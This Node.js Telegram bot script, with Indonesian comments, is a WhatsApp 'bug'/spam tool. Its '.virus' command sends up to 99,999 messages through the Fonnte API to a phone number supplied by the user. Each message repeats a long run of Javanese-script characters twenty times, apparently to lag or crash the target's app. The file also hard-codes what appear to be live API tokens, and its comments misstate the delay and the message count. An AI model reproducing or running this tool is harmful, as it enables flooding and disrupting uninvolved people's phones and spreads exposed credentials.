// bot_kirim2_mod.js
// npm install node-telegram-bot-api axios
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8499584477:AAEwTvcdjckwU_vHJ6C2dgUUfqoiKbmUFNQ';
const FONNTE_KEY    = process.env.FONNTE_KEY    || 'ctKBo8JdYJ3XqxPBD6Fg';
if(!TELEGRAM_TOKEN || !FONNTE_KEY){ console.error('Set TELEGRAM_TOKEN & FONNTE_KEY'); process.exit(1); }

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const make20 = txt => Array.from({length:20}).map(()=>txt).join('\n');
const sleep = ms => new Promise(r=>setTimeout(r,ms));

bot.on('message', async msg=>{
  try{
    const chatId = msg.chat.id;
    const t = (msg.text||'').trim();

    // ===== Perintah .menu =====
    if(t === '.menu') {
      if(!fs.existsSync('./nina.jpg')) return bot.sendMessage(chatId, 'Foto nina.jpg tidak ditemukan!');
      await bot.sendPhoto(chatId, fs.readFileSync('./nina.jpg'), {
        caption: `番号を入力して直接送信\n\nDEV:RIFAT\nV:v1\n\n送信 .virus 62××××××\nまだ受け入れる`
      });
      return;
    }

    // ===== Perintah .kirim20 =====
    if(!t.startsWith('.virus')) return;
    const parts = t.split(/\s+/);
    const target = parts[1];
    const text = parts.slice(2).join(' ') || 'ꦾ'.repeat(100);

    if(!target) return bot.sendMessage(chatId,'Format: .virus 62812xxxx [isi]');

    const payloadText = make20(text);

    // kirim 20 pesan cepat, 1 detik jeda antar pesan
    const results = [];
    for (let i = 1; i <= 99999; i++) {
      try {
        const res = await axios.post('https://api.fonnte.com/send',
          { target: target.trim(), message: payloadText },
          { headers: { Authorization: FONNTE_KEY }, timeout: 20000 }
        );
        results.push({ i, ok: true, data: res.data });
        await bot.sendMessage(chatId, `Pesan ${i} queued: ${JSON.stringify(res.data)}`);
      } catch (e) {
        results.push({ i, ok: false, err: e?.response?.data || e.message });
        await bot.sendMessage(chatId, `Pesan ${i} gagal: ${JSON.stringify(e?.response?.data || e.message)}`);
      }
      await sleep(5); // delay 1 detik
    }

    const successCount = results.filter(r=>r.ok).length;
    bot.sendMessage(chatId, `Selesai. ${successCount}/20 pesan queued berhasil.`);
    
  } catch(e){
    console.error(e?.response?.data || e.message);
    bot.sendMessage(msg.chat.id, '❌ Gagal. Cek API key / koneksi.');
  }
});
